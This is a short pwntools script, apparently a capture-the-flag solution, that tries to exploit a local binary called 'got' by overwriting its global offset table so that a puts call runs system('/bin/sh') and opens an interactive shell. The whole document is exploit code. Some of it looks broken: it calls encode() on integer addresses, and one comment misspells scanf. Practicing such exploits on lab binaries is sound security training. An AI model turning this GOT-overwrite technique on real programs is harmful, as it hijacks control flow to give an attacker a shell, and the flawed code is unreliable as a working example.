from pwn import *

elf = ELF("./got")

p = elf.process()
#scnaf("%23")
p.sendline(b"/bin/sh")

p.sendline(str(elf.got["puts"].encode()))

p.sendline(str(elf.got["system"].encode()))
#system@plt
p.interactive()
# puts --> puts@plt --> puts@got
#system@plt --> system@got